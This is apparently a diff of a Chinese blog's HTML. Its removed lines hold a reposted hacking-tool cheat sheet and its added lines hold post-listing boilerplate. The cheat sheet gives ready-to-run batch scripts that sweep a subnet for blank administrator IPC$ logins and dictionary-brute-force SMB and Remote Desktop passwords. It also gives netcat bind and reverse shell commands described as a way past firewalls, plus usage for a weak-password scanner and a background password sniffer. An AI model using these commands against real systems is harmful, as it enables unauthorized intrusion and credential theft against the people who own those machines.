-<p>批处理每次能处理的变量从%0—%9共10个，其中%0默认给批处理文件名使用，%1默认为使用此批处理时输入的的第一个值，同理：%2—%9指输入的第2-9个值；例：net use ipipc$ pass /user:user 中ip为%1,pass为%2 ,user为%3</p>
-</li>
-<li>
-<p>(set):指定一个或一组文件，可使用通配符，如：(D:user.txt)和(1 1 254)(1 -1 254),{ “(1 1 254)”第一个&quot;1&quot;指起始值，第二个&quot;1&quot;指增长量，第三个&quot;254&quot;指结束值，即：从1到254；“(1 -1 254)”说明：即从254到1 }</p>
-</li>
-<li>
-<p>command：指定对第个文件执行的命令，如：net use命令；如要执行多个命令时，命令这间加：&amp; 来隔开</p>
-</li>
-<li>
-<p>command_parameters：为特定命令指定参数或命令行开关</p>
-</li>
-<li>
-<p>IN (set)：指在(set)中取值；DO command ：指执行command</p>
-</li>
-<li>
-<p>参数：/L 指用增量形式{ (set)为增量形式时 }；/F 指从文件中不断取值，直到取完为止{ (set)为文件时，如(d:pass.txt)时 }。</p>
-</li>
-<li>
-<p>用法举例：</p>
-</li>
-<li>
-<p>@echo off</p>
-</li>
-<li>
-<p>echo 用法格式：test.bat <em>.</em>.* &gt; test.txt</p>
-</li>
-<li>
-<p>for /L %%G in (1 1 254) do echo %1.%%G &gt;&gt;test.txt &amp; net use %1.%%G /user:administrator | find “命令成功完成” &gt;&gt;test.txt</p>
-</li>
-<li>
-<p>存为test.bat 说明：对指定的一个C类网段的254个IP依次试建立administrator密码为空的IPC$连接，如果成功就把该IP存在test.txt中。</p>
-</li>
-<li>
-<p>/L指用增量形式（即从1-254或254-1）；输入的IP前面三位：<em>.</em>.*为批处理默认的 %1；%%G 为变量(ip的最后一位）；&amp; 用来隔开echo 和net use 这二个命令；| 指建立了ipc$后，在结果中用find查看是否有&quot;命令成功完成&quot;信息；%1.%%G 为完整的IP地址；(1 1 254) 指起始值，增长量，结止值。</p>
-</li>
-<li>
-<p>@echo off</p>
-</li>
-<li>
-<p>echo 用法格式：ok.bat ip</p>
-</li>
-<li>
-<p>FOR /F %%i IN (D:user.dic) DO smb.exe %1 %%i D:pass.dic 200</p>
-</li>
-<li>
-<p>存为：ok.exe 说明：输入一个IP后，用字典文件d:pass.dic来暴解d:user.dic中的用户密码，直到文件中值取完为止。%%i为用户名；%1为输入的IP地址（默认）。</p>
-</li>
-<li>
-<p>七：</p>
-</li>
-<li>
-<p>2：if命令及变量 基本格式</p>
-</li>
-<li>
-<p>IF [not] errorlevel 数字 命令语句 如果程序运行最后返回一个等于或大于指定数字的退出编码，指定条件为“真”。</p>
-</li>
-<li>
-<p>例：IF errorlevel 0 命令 指程序执行后返回的值为0时，就值行后面的命令；IF not errorlevel 1 命令指程序执行最后返回的值不等于1，就执行后面的命令。</p>
-</li>
-<li>
-<p>0 指发现并成功执行（真）；1 指没有发现、没执行（假）。</p>
-</li>
-<li>
-<p>IF [not] 字符串1==字符串2 命令语句 如果指定的文本字符串匹配（即：字符串1 等于 字符串2），就执行后面的命令。</p>
-</li>
-<li>
-<p>例：“if “%2%”==“4” goto start”指：如果输入的第二个变量为4时，执行后面的命令（注意：调用变量时就%变量名%并加&quot; &quot;）</p>
-</li>
-<li>
-<p>IF [not] exist 文件名 命令语句 如果指定的文件名存在，就执行后面的命令。</p>
-</li>
-<li>
-<p>例：“if not nc.exe goto end”指：如果没有发现nc.exe文件就跳到&quot;:end&quot;标签处。</p>
-</li>
-<li>
-<p>IF [not] errorlevel 数字 命令语句 else 命令语句或 IF [not] 字符串1==字符串2 命令语句 else 命令语句或 IF [not] exist 文件名 命令语句 else 命令语句 加上：else 命令语句后指：当前面的条件不成立时，就指行else后面的命令。注意：else 必须与 if 在同一行才有效。 当有del命令时需把del命令全部内容用&lt; &gt;括起来，因为del命令要单独一行时才能执行，用上&lt; &gt;后就等于是单独一行了；例如：“if exist test.txt. <del test.txt.> else echo test.txt.missing ”，注意命令中的“.”</p>
-</li>
-<li>
-<p>系统外部命令</p>
-</li>
-<li>
-<p>注：系统外部命令(均需下载相关工具)</p>
-</li>
-<li>
-<p>瑞士军刀：nc.exe</p>
-</li>
-<li>
-<p>参数说明：</p>
-</li>
-<li>
-<p>-h 查看帮助信息</p>
-</li>
-<li>
-<p>-d 后台模式</p>
-</li>
-<li>
-<p>-e prog程序重定向，一但连接就执行[危险]</p>
-</li>
-<li>
-<p>-i secs延时的间隔</p>
-</li>
-<li>
-<p>-l 监听模式，用于入站连接</p>
-</li>
-<li>
-<p>-L 监听模式，连接天闭后仍然继续监听，直到CTR+C</p>
-</li>
-<li>
-<p>-n IP地址，不能用域名</p>
-</li>
-<li>
-<p>-o film记录16进制的传输</p>
-</li>
-<li>
-<p>-p[空格]端口 本地端口号</p>
-</li>
-<li>
-<p>-r 随机本地及远程端口</p>
-</li>
-<li>
-<p>-t 使用Telnet交互方式</p>
-</li>
-<li>
-<p>-u UDP模式</p>
-</li>
-<li>
-<p>-v 详细输出，用-vv将更详细</p>
-</li>
-<li>
-<p>-w数字 timeout延时间隔</p>
-</li>
-<li>
-<p>-z 将输入，输出关掉（用于扫锚时）</p>
-</li>
-<li>
-<p>基本用法：</p>
-</li>
-<li>
-<p>nc -nvv 192.168.0.1 80 连接到192.168.0.1主机的80端口</p>
-</li>
-<li>
-<p>nc -l -p 80 开启本机的TCP 80端口并监听</p>
-</li>
-<li>
-<p>nc -nvv -w2 -z 192.168.0.1 80-1024 扫锚192.168.0.1的80-1024端口</p>
-</li>
-<li>
-<p>nc -l -p 5354 -t -e c:winntsystem32cmd.exe 绑定remote主机的cmdshell在remote的TCP 5354端口</p>
-</li>
-<li>
-<p>nc -t -e c:winntsystem32cmd.exe 192.168.0.2 5354 梆定remote主机的cmdshell并反向连接192.168.0.2的5354端口</p>
-</li>
-<li>
-<p>高级用法：</p>
-</li>
-<li>
-<p>nc -L -p 80 作为蜜罐用1：开启并不停地监听80端口，直到CTR+C为止</p>
-</li>
-<li>
-<p>nc -L -p 80 &gt; c:log.txt 作为蜜罐用2：开启并不停地监听80端口，直到CTR+C,同时把结果输出到c:log.txt</p>
-</li>
-<li>
-<p>nc -L -p 80 &lt; c:honeyport.txt 作为蜜罐用3-1：开启并不停地监听80端口，直到CTR+C,并把c:honeyport.txt中内容送入管道中，亦可起到传送文件作用</p>
-</li>
-<li>
-<p>type.exe c:honeyport | nc -L -p 80 作为蜜罐用3-2：开启并不停地监听80端口，直到CTR+C,并把c:honeyport.txt中内容送入管道中,亦可起到传送文件作用</p>
-</li>
-<li>
-<p>本机上用：nc -l -p 本机端口</p>
-</li>
-<li>
-<p>在对方主机上用：nc -e cmd.exe 本机IP -p 本机端口 *win2K</p>
-</li>
-<li>
-<p>nc -e /bin/sh 本机IP -p 本机端口 *linux,unix 反向连接突破对方主机的防火墙</p>
-</li>
-<li>
-<p>本机上用：nc -d -l -p 本机端口 &lt; 要传送的文件路径及名称</p>
-</li>
-<li>
-<p>在对方主机上用：nc -vv 本机IP 本机端口 &gt; 存放文件的路径及名称 传送文件到对方主机</p>
-</li>
-<li>
-<p>备 注：</p>
-</li>
-<li>
-<p>| 管道命令</p>
-</li>
-<li>
-<p>&lt; 或 &gt; 重定向命令。“&lt;”，例如：tlntadmn &lt; test.txt 指把test.txt的内容赋值给tlntadmn命令</p>
-</li>
-<li>
-<p>@ 表示执行@后面的命令，但不会显示出来（后台执行）；例：@dir c:winnt &gt;&gt; d:log.txt 意思是：后台执行dir，并把结果存在d:log.txt中</p>
-</li>
-<li>
-<p>&gt;与&gt;&gt;的区别 &quot;&gt;“指：覆盖；”&gt;&gt;&quot;指：保存到(添加到）。</p>
-</li>
-<li>
-<p>如：@dir c:winnt &gt;&gt; d:log.txt和@dir c:winnt &gt; d:log.txt二个命令分别执行二次比较看：用&gt;&gt;的则是把二次的结果都保存了，而用：&gt;则只有一次的结果，是因为第二次的结果把第一次的覆盖了。</p>
-</li>
-<li>
-<p>八：</p>
-</li>
-<li>
-<p>扫描工具：xscan.exe</p>
-</li>
-<li>
-<p>基本格式</p>
-</li>
-<li>
-<p>xscan -host &lt;起始IP&gt;[-&lt;终止IP&gt;] &lt;检测项目&gt; [其他选项] 扫锚&quot;起始IP到终止IP&quot;段的所有主机信息</p>
-</li>
-<li>
-<p>xscan -file &lt;主机列表文件名&gt; &lt;检测项目&gt; [其他选项] 扫锚&quot;主机IP列表文件名&quot;中的所有主机信息</p>
-</li>
-<li>
-<p>检测项目</p>
-</li>
-<li>
-<p>-active 检测主机是否存活</p>
-</li>
-<li>
-<p>-os 检测远程操作系统类型（通过NETBIOS和SNMP协议）</p>
-</li>
-<li>
-<p>-port 检测常用服务的端口状态</p>
-</li>
-<li>
-<p>-ftp 检测FTP弱口令</p>
-</li>
-<li>
-<p>-pub 检测FTP服务匿名用户写权限</p>
-</li>
-<li>
-<p>-pop3 检测POP3-Server弱口令</p>
-</li>
-<li>
-<p>-smtp 检测SMTP-Server漏洞</p>
-</li>
-<li>
-<p>-sql 检测SQL-Server弱口令</p>
-</li>
-<li>
-<p>-smb 检测NT-Server弱口令</p>
-</li>
-<li>
-<p>-iis 检测IIS编码/解码漏洞</p>
-</li>
-<li>
-<p>-cgi 检测CGI漏洞</p>
-</li>
-<li>
-<p>-nasl 加载Nessus攻击脚本</p>
-</li>
-<li>
-<p>-all 检测以上所有项目</p>
-</li>
-<li>
-<p>其它选项</p>
-</li>
-<li>
-<p>-i 适配器编号 设置网络适配器, &lt;适配器编号&gt;可通过&quot;-l&quot;参数获取</p>
-</li>
-<li>
-<p>-l 显示所有网络适配器</p>
-</li>
-<li>
-<p>-v 显示详细扫描进度</p>
-</li>
-<li>
-<p>-p 跳过没有响应的主机</p>
-</li>
-<li>
-<p>-o 跳过没有检测到开放端口的主机</p>
-</li>
-<li>
-<p>-t 并发线程数量,并发主机数量 指定最大并发线程数量和并发主机数量, 默认数量为100,10</p>
-</li>
-<li>
-<p>-log 文件名 指定扫描报告文件名 (后缀为：TXT或HTML格式的文件)</p>
-</li>
-<li>
-<p>用法示例</p>
-</li>
-<li>
-<p>xscan -host 192.168.1.1-192.168.255.255 -all -active -p　检测192.168.1.1-192.168.255.255网段内主机的所有漏洞，跳过无响应的主机</p>
-</li>
-<li>
-<p>xscan -host 192.168.1.1-192.168.255.255 -port -smb -t 150 -o 检测192.168.1.1-192.168.255.255网段内主机的标准端口状态，NT弱口令用户，最大并发线程数量为150，跳过没有检测到开放端口的主机</p>
-</li>
-<li>
-<p>xscan -file hostlist.txt -port -cgi -t 200,5 -v -o 检测“hostlist.txt”文件中列出的所有主机的标准端口状态，CGI漏洞，最大并发线程数量为200，同一时刻最多检测5台主机，显示详细检测进度，跳过没有检测到开放端口的主机</p>
-</li>
-<li>
-<p>九：</p>
-</li>
-<li>
-<p>命令行方式嗅探器: xsniff.exe</p>
-</li>
-<li>
-<p>可捕获局域网内FTP/SMTP/POP3/HTTP协议密码</p>
-</li>
-<li>
-<p>参数说明</p>
-</li>
-<li>
-<p>-tcp 输出TCP数据报</p>
-</li>
-<li>
-<p>-udp 输出UDP数据报</p>
-</li>
-<li>
-<p>-icmp 输出ICMP数据报</p>
-</li>
-<li>
-<p>-pass 过滤密码信息</p>
-</li>
-<li>
-<p>-hide 后台运行</p>
-</li>
-<li>
-<p>-host 解析主机名</p>
-</li>
-<li>
-<p>-addr IP地址 过滤IP地址</p>
-</li>
-<li>
-<p>-port 端口 过滤端口</p>
-</li>
-<li>
-<p>-log 文件名 将输出保存到文件</p>
-</li>
-<li>
-<p>-asc 以ASCII形式输出</p>
-</li>
-<li>
-<p>-hex 以16进制形式输出</p>
-</li>
-<li>
-<p>用法示例</p>
-</li>
-<li>
-<p>xsniff.exe -pass -hide -log pass.log 后台运行嗅探密码并将密码信息保存在pass.log文件中</p>
-</li>
-<li>
-<p>xsniff.exe -tcp -udp -asc -addr 192.168.1.1 嗅探192.168.1.1并过滤tcp和udp信息并以ASCII格式输出</p>
-</li>
-<li>
-<p>终端服务密码破解: tscrack.exe</p>
-</li>
-<li>
-<p>参数说明</p>
-</li>
-<li>
-<p>-h 显示使用帮助</p>
-</li>
-<li>
-<p>-v 显示版本信息</p>
-</li>
-<li>
-<p>-s 在屏幕上打出解密能力</p>
-</li>
-<li>
-<p>-b 密码错误时发出的声音</p>
-</li>
-<li>
-<p>-t 同是发出多个连接（多线程）</p>
-</li>
-<li>
-<p>-N Prevent System Log entries on targeted server</p>
-</li>
-<li>
-<p>-U 卸载移除tscrack组件</p>
-</li>
-<li>
-<p>-f 使用－f后面的密码</p>
-</li>
-<li>
-<p>-F 间隔时间（频率）</p>
-</li>
-<li>
-<p>-l 使用－l后面的用户名</p>
-</li>
-<li>
-<p>-w 使用－w后面的密码字典</p>
-</li>
-<li>
-<p>-p 使用－p后面的密码</p>
-</li>
-<li>
-<p>-D 登录主页面</p>
-</li>
-<li>
-<p>用法示例</p>
-</li>
-<li>
-<p>tscrack 192.168.0.1 -l administrator -w pass.dic 远程用密码字典文件暴破主机的administrator的登陆密码</p>
-</li>
-<li>
-<p>tscrack 192.168.0.1 -l administrator -p 123456 用密码123456远程登陆192.168.0.1的administrator用户</p>
-</li>
-<li>
-<p>@if not exist ipcscan.txt goto noscan</p>
-</li>
-<li>
-<p>@for /f &quot;tokens=1 delims= &quot; %%i in (3389.txt) do call hack.bat %%i</p>
-</li>
-<li>
-<p>nscan</p>
-</li>
-<li>
-<p>@echo 3389.txt no find or scan faild</p>
-</li>
-<li>
-<p>(①存为3389.bat) （假设现有用SuperScan或其它扫锚器扫到一批开有3389的主机IP列表文件3389.txt)</p>
-</li>
-<li>
-<p>3389.bat意思是：从3389.txt文件中取一个IP，接着运行hack.bat</p>
-</li>
-<li>
-<p>@if not exist tscrack.exe goto noscan</p>
-</li>
-<li>
-<p>@tscrack %1 -l administrator -w pass.dic &gt;&gt;rouji.txt</p>
-</li>
-<li>
-<p>:noscan</p>
-</li>
-<li>
-<p>@echo tscrack.exe no find or scan faild</p>
-</li>
-<li>
-<p>(②存为hack.bat) (运行3389.bat就OK，且3389.bat、hack.bat、3389.txt、pass.dic与tscrack.exe在同一个目录下；就可以等待结果了)</p>
-</li>
-<li>
-<p>hack.bat意思是：运行tscrack.exe用字典暴破3389.txt中所有主机的administrator密码，并将破解结果保存在rouji.txt文件中。</p>
-</li>
-<li>
-<p>其它</p>
-</li>
-<li>
-<p>Shutdown.exe</p>
-</li>
-<li>
-<p>Shutdown IP地址 t:20 20秒后将对方NT自动关闭（Windows 2003系统自带工具，在Windows2000下用进就得下载此工具才能用。在前面Windows 2003 DOS命令中有详细介绍。）</p>
-</li>
-<li>
-<p>fpipe.exe (TCP端口重定向工具) 在第二篇中有详细说明（端口重定向绕过防火墙）</p>
-</li>
-<li>
-<p>fpipe -l 80 -s 1029 -r 80 当有人扫锚你的80端口时，他扫到的结果会完全是的主机信息</p>
-</li>
-<li>
-<p>Fpipe -l 23 -s 88 -r 23 目标IP 把本机向目标IP发送的23端口Telnet请求经端口重定向后，就通过88端口发送到目标IP的23端口。（与目标IP建立Telnet时本机就用的88端口与其相连接）然后：直接Telnet 127.0.0.1（本机IP）就连接到目标IP的23端口了。</p>
-</li>
-<li>
-<p>OpenTelnet.exe (远程开启telnet工具)</p>
-</li>
-<li>
-<p>opentelnet.exe IP 帐号　密码　ntlm认证方式　Telnet端口 （不需要上传ntlm.exe破坏微软的身份验证方式）直接远程开启对方的telnet服务后，就可用telnet ip 连接上对方。</p>
-</li>
-<li>
-<p>NTLM认证方式：0：不使用NTLM身份验证；1：先尝试NTLM身份验证，如果失败，再使用用户名和密码；2：只使用NTLM身份验证。</p>
-</li>
-<li>
-<p>ResumeTelnet.exe (OpenTelnet附带的另一个工具)</p>
-</li>
-<li>
-<p>resumetelnet.exe IP　帐号　密码 用Telnet连接完对方后，就用这个命令将对方的Telnet设置还原，并同时关闭Telnet服务。</p>
-</li>
-<li>
-<p>FTP命令详解</p>
-</li>
-<li>
-<p>FTP命令是Internet用户使用最频繁的命令之一，熟悉并灵活应用FTP的内部命令，可以大大方便使用者，并收到事半功倍之效。如果你想学习使用进行后台FTP下载，那么就必须学习FTP指令。</p>
-</li>
-<li>
-<p>FTP的命令行格式为：</p>
-</li>
-<li>
-<p>ftp -v -d -i -n -g [主机名] ，其中</p>
-</li>
-<li>
-<p>-v 显示远程服务器的所有响应信息</p>
-</li>
-<li>
-<p>-n 限制ftp的自动登录，即不使用；.n etrc文件；</p>
-</li>
-<li>
-<p>-d 使用调试方式；</p>
-</li>
-<li>
-<p>-g 取消全局文件名。</p>
-</li>
-<li>
-<p>FTP使用的内部命令如下(中括号表示可选项):</p>
-</li>
-<li>
-<p>1.![cmd[args]]：在本地机中执行交互shell，exit回到ftp环境，如：!ls*.zip</p>
-</li>
-<li>
-<p>2.$ macro-ame[args]： 执行宏定义macro-name。</p>
-</li>
-<li>
-<p>3.account[password]： 提供登录远程系统成功后访问系统资源所需的补充口令。</p>
-</li>
-<li>
-<p>4.append local-file[remote-file]：将本地文件追加到远程系统主机，若未指定远程系统文件名，则使用本地文件名。</p>
-</li>
-<li>
-<p>5.ascii：使用ascii类型传输方式。</p>
-</li>
-<li>
-<p>6.bell：每个命令执行完毕后计算机响铃一次。</p>
-</li>
-<li>
-<p>7.bin：使用二进制文件传输方式。</p>
-</li>
-<li>
-<p>8.bye：退出ftp会话过程。</p>
-</li>
-<li>
-<p>9.case：在使用mget时，将远程主机文件名中的大写转为小写字母。</p>
-</li>
-<li>
-<p>10. cd remote-dir：进入远程主机目录。</p>
-</li>
-<li>
-<p>11.cdup：进入远程主机目录的父目录。</p>
-</li>
-<li>
-<p>12.chmod mode file-name：将远程主机文件file-name的存取方式设置为mode，如：chmod 777 a.out。</p>
-</li>
-<li>
-<p>13.close：中断与远程服务器的ftp会话(与open对应)。</p>
-</li>
-<li>
-<p>14 .cr：使用asscii方式传输文件时，将回车换行转换为回行。</p>
-</li>
-<li>
-<p>15.delete remote-file：删除远程主机文件。</p>
-</li>
-<li>
-<p>16.debug[debug-value]：设置调试方式， 显示发送至远程主机的每条命令，如：deb up 3，若设为0，表示取消debug。</p>
-</li>
-<li>
-<p>17.dir[remote-dir][local-file]：显示远程主机目录，并将结果存入本地文件。</p>
-</li>
-<li>
-<p>18.disconnection：同close。</p>
-</li>
-<li>
-<p>19.form format：将文件传输方式设置为format，缺省为file方式。</p>
-</li>
-<li>
-<p>20.get remote-file[local-file]： 将远程主机的文件remote-file传至本地硬盘的local-file。</p>
-</li>
-<li>
-<p>21.glob：设置mdelete，mget，mput的文件名扩展，缺省时不扩展文件名，同命令行的-g参数。</p>
-</li>
-<li>
-<p>22.hash：每传输1024字节，显示一个hash符号(#)。</p>
-</li>
-<li>
-<p>23.help[cmd]：显示ftp内部命令cmd的帮助信息，如：help get。</p>
-</li>
-<li>
-<p>24.idle[seconds]：将远程服务器的休眠计时器设为[seconds]秒。</p>
-</li>
-<li>
-<p>25.image：设置二进制传输方式(同binary)。</p>
-</li>
-<li>
-<p>26.lcd[dir]：将本地工作目录切换至dir。</p>
-</li>
-<li>
-<p>27. ls[remote-dir][local-file]：显示远程目录remote-dir， 并存入本地文件local-file。</p>
-</li>
-<li>
-<p>28.macdef macro-name：定义一个宏，遇到macdef下的空行时，宏定义结束。</p>
-</li>
-<li>
-<p>29.mdelete[remote-file]：删除远程主机文件。</p>
-</li>
-<li>
-<p>30.mdir remote-files local-file：与dir类似，但可指定多个远程文件，如 ：mdir <em>.o.</em>.zipoutfile 。</p>
-</li>
-<li>
-<p>31.mget remote-files：传输多个远程文件。</p>
-</li>
-<li>
-<p>32.mkdir dir-name：在远程主机中建一目录。</p>
-</li>
-<li>
-<p>33.mls remote-file local-file：同nlist，但可指定多个文件名。</p>
-</li>
-<li>
-<p>34.mode[modename]：将文件传输方式设置为modename， 缺省为stream方式。</p>
-</li>
-<li>
-<p>35.modtime file-name：显示远程主机文件的最后修改时间。</p>
-</li>
-<li>
-<p>36.mput local-file：将多个文件传输至远程主机。</p>
-</li>
-<li>
-<p>37.newer file-name： 如果远程机中file-name的修改时间比本地硬盘同名文件的时间更近，则重传该文件。</p>
-</li>
-<li>
-<p>38.nlist[remote-dir][local-file]：显示远程主机目录的文件清单，并存入本地硬盘的local-file。</p>
-</li>
-<li>
-<p>39.nmap[inpattern outpattern]：设置文件名映射机制， 使得文件传输时，文件中的某些字符相互转换， 如：nmap $1.$2.$3[$1，$2].[$2，$3]，则传输文件a1.a2.a3时，文件名变为a1，a2。 该命令特别适用于远程主机为非UNIX机的情况。</p>
-</li>
-<li>
-<p>40.ntrans[inchars[outchars]]：设置文件名字符的翻译机制，如ntrans1R，则文件名LLL将变为RRR。</p>
-</li>
-<li>
-<p>41.open host[port]：建立指定ftp服务器连接，可指定连接端口。</p>
-</li>
-<li>
-<p>42.passive：进入被动传输方式。</p>
-</li>
-<li>
-<p>43.prompt：设置多个文件传输时的交互提示。</p>
-</li>
-<li>
-<p>44.proxy ftp-cmd：在次要控制连接中，执行一条ftp命令， 该命令允许连接两个ftp服务器，以在两个服务器间传输文件。第一条ftp命令必须为open，以首先建立两个服务器间的连接。</p>
-</li>
-<li>
-<p>45.put local-file[remote-file]：将本地文件local-file传送至远程主机。</p>
-</li>
-<li>
-<p>46.pwd：显示远程主机的当前工作目录。</p>
-</li>
-<li>
-<p>47.quit：同bye，退出ftp会话。</p>
-</li>
-<li>
-<p>48.quote arg1，arg2…：将参数逐字发至远程ftp服务器，如：quote syst.</p>
-</li>
-<li>
-<p>49.recv remote-file[local-file]：同get。</p>
-</li>
-<li>
-<p>50.reget remote-file[local-file]：类似于get， 但若local-file存在，则从上次传输中断处续传。</p>
-</li>
-<li>
-<p>51.rhelp[cmd-name]：请求获得远程主机的帮助。</p>
-</li>
-<li>
-<p>52.rstatus[file-name]：若未指定文件名，则显示远程主机的状态， 否则显示文件状态。</p>
-</li>
-<li>
-<p>53.rename[from][to]：更改远程主机文件名。</p>
-</li>
-<li>
-<p>54.reset：清除回答队列。</p>
-</li>
-<li>
-<p>55.restart marker：从指定的标志marker处，重新开始get或put，如：restart 130。</p>
-</li>
-<li>
-<p>56.rmdir dir-name：删除远程主机目录。</p>
-</li>
-<li>
-<p>57.runique：设置文件名只一性存储，若文件存在，则在原文件后加后缀.1， .2等。</p>
-</li>
-<li>
-<p>58.send local-file[remote-file]：同put。</p>
-</li>
-<li>
-<p>59.sendport：设置PORT命令的使用。</p>
-</li>
-<li>
-<p>60.site arg1，arg2…：将参数作为SITE命令逐字发送至远程ftp主机。</p>
-</li>
-<li>
-<p>61.size file-name：显示远程主机文件大小，如：site idle 7200。</p>
-</li>
-<li>
-<p>62.status：显示当前ftp状态。</p>
-</li>
-<li>
-<p>63.struct[struct-name]：将文件传输结构设置为struct-name， 缺省时使用stream结构。</p>
-</li>
-<li>
-<p>64.sunique：将远程主机文件名存储设置为只一(与runique对应)。</p>
-</li>
-<li>
-<p>65.system：显示远程主机的操作系统类型。</p>
-</li>
-<li>
-<p>66.tenex：将文件传输类型设置为TENEX机的所需的类型。</p>
-</li>
-<li>
-<p>67.tick：设置传输时的字节计数器。</p>
-</li>
-<li>
-<p>68.trace：设置包跟踪。</p>
-</li>
-<li>
-<p>69.type[type-name]：设置文件传输类型为type-name，缺省为ascii，如:type binary，设置二进制传输方式。</p>
-</li>
-<li>
-<p>70.umask[newmask]：将远程服务器的缺省umask设置为newmask，如：umask 3</p>
-</li>
-<li>
-<p>71.user user-name[password][account]：向远程主机表明自己的身份，需要口令时，必须输入口令，如：user anonymous my@email。</p>
-</li>
-<li>
-<p>72.verbose：同命令行的-v参数，即设置详尽报告方式，ftp 服务器的所有响 应都将显示给用户，缺省为on.</p>
-</li>
-<li>
-<p>73.?[cmd]：同help.</p>
-</li>
-</ul>
-
+      转载，用于查询工具。
+      
+        <div class="readmore">
+          <a href="/archives/aee69fbc.html" class="flat-box">
+            <i class="fas fa-book-open fa-fw" aria-hidden="true"></i>
+            阅读全文
+          </a>
+        </div>
       
     </div>
+    
+  </section>
+</article>
+
+          </div>
+        
+      
+        
+          <div class='post-wrapper'>
+            <article class="post reveal ">
+  
+
+
+  <section class='meta'>
+    
+    
+    <div class="meta" id="header-meta">
+      
+        
+  <h2 class="title">
+    <a href="/archives/7ef58b2f.html">
+      把Linux给我我就能用！
+    </a>
+  </h2>
+
+
+      
+      <div class='new-meta-box'>
+        
+          
+        
+          
+            
+  <div class='new-meta-item author'>
+    <a href="/https:/cxpeng.cn" rel="nofollow">
+      
+        <img src="https://i.loli.net/2019/05/17/5cde5331de4a260723.jpg">
+      
+      <p>Alex</p>
+    </a>
+  </div>
+
+
+          
+        
+          
+            <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+    <p>2019-04-03</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  
+  <div class='new-meta-item category'>
+    <a href='/categories/%E6%8A%80%E6%9C%AF%E7%BB%8F%E9%AA%8C/' rel="nofollow">
+      <i class="fas fa-folder-open" aria-hidden="true"></i>
+      <p>技术经验</p>
+    </a>
+  </div>
+
+
+          
+        
+          
+            
+
+          
+        
+          
+            
+
+          
+        
+      </div>
+      
+        <hr>
+      
+    </div>
+  </section>
+
+
+  <section class="article typo">
+    <div class="article-entry" itemprop="articleBody">
+      开启使用学习的新世界！
+      
+        <div class="readmore">
+          <a href="/archives/7ef58b2f.html" class="flat-box">
+            <i class="fas fa-book-open fa-fw" aria-hidden="true"></i>
+            阅读全文
+          </a>
+        </div>
+      
+    </div>
+    
+      <div class="full-width auto-padding tags">
+        
+          <a href="/tags/Linux/" rel="nofollow"><i class="fas fa-hashtag fa-fw"></i>Linux</a>
+        
+      </div>
+    
+  </section>
+</article>
+
+          </div>
+        
+      
+        
+          <div class='post-wrapper'>
+            <article class="post reveal ">
+  
+
+
+  <section class='meta'>
+    
+    
+    <div class="meta" id="header-meta">
+      
+        
+  <h2 class="title">
+    <a href="/archives/749620d3.html">
+      360在线笔试编程题
+    </a>
+  </h2>
+
+
+      
+      <div class='new-meta-box'>
+        
+          
+        
+          
+            
+  <div class='new-meta-item author'>
+    <a href="/https:/cxpeng.cn" rel="nofollow">
+      
+        <img src="https://i.loli.net/2019/05/17/5cde5331de4a260723.jpg">
+      
+      <p>Alex</p>
+    </a>
+  </div>
+
+
+          
+        
+          
+            <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+    <p>2019-04-03</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  
+  <div class='new-meta-item category'>
+    <a href='/categories/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/' rel="nofollow">
+      <i class="fas fa-folder-open" aria-hidden="true"></i>
+      <p>生活随笔</p>
+    </a>
+  </div>
+
+
+          
+        
+          
+            
+
+          
+        
+          
+            
+
+          
+        
+      </div>
+      
+        <hr>
+      
+    </div>
+  </section>
+
+
+  <section class="article typo">
+    <div class="article-entry" itemprop="articleBody">
+      申请360公司机器学习实习生---失败！
+      
+        <div class="readmore">
+          <a href="/archives/749620d3.html" class="flat-box">
+            <i class="fas fa-book-open fa-fw" aria-hidden="true"></i>
+            阅读全文
+          </a>
+        </div>
+      
+    </div>
+    
+      <div class="full-width auto-padding tags">
+        
+          <a href="/tags/%E7%BC%96%E7%A8%8B/" rel="nofollow"><i class="fas fa-hashtag fa-fw"></i>编程</a>
+        
+      </div>
     
   </section>
 </article>
@@ -3135,31 +1483,9 @@ cout&lt;&lt;*it&lt;&lt;endl;</p>
     <div class='content pure'>
       <ul class="entry">
         
-          <li><a class="flat-box" title="/categories/5G/" href="/categories/5G/"><div class='name'>5G</div><div class='badge'>(1)</div></a></li>
+          <li><a class="flat-box" title="/categories/%E6%8A%80%E6%9C%AF%E7%BB%8F%E9%AA%8C/" href="/categories/%E6%8A%80%E6%9C%AF%E7%BB%8F%E9%AA%8C/"><div class='name'>技术经验</div><div class='badge'>(26)</div></a></li>
         
-          <li><a class="flat-box" title="/categories/C-C/" href="/categories/C-C/"><div class='name'>C/C++</div><div class='badge'>(1)</div></a></li>
-        
-          <li><a class="flat-box" title="/categories/Linux/" href="/categories/Linux/"><div class='name'>Linux</div><div class='badge'>(4)</div></a></li>
-        
-          <li><a class="flat-box" title="/categories/Python/" href="/categories/Python/"><div class='name'>Python</div><div class='badge'>(7)</div></a></li>
-        
-          <li><a class="flat-box" title="/categories/opencv%E5%AD%A6%E4%B9%A0/" href="/categories/opencv%E5%AD%A6%E4%B9%A0/"><div class='name'>opencv学习</div><div class='badge'>(2)</div></a></li>
-        
-          <li><a class="flat-box" title="/categories/%E5%8D%9A%E5%AE%A2%E4%BC%98%E5%8C%96/" href="/categories/%E5%8D%9A%E5%AE%A2%E4%BC%98%E5%8C%96/"><div class='name'>博客优化</div><div class='badge'>(2)</div></a></li>
-        
-          <li><a class="flat-box" title="/categories/%E5%90%91%E5%BE%80%E7%9A%84%E7%94%9F%E6%B4%BB/" href="/categories/%E5%90%91%E5%BE%80%E7%9A%84%E7%94%9F%E6%B4%BB/"><div class='name'>向往的生活</div><div class='badge'>(7)</div></a></li>
-        
-          <li><a class="flat-box" title="/categories/%E5%AE%9E%E7%94%A8%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/" href="/categories/%E5%AE%9E%E7%94%A8%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/"><div class='name'>实用工具汇总</div><div class='badge'>(3)</div></a></li>
-        
-          <li><a class="flat-box" title="/categories/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/" href="/categories/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/"><div class='name'>数据分析</div><div class='badge'>(2)</div></a></li>
-        
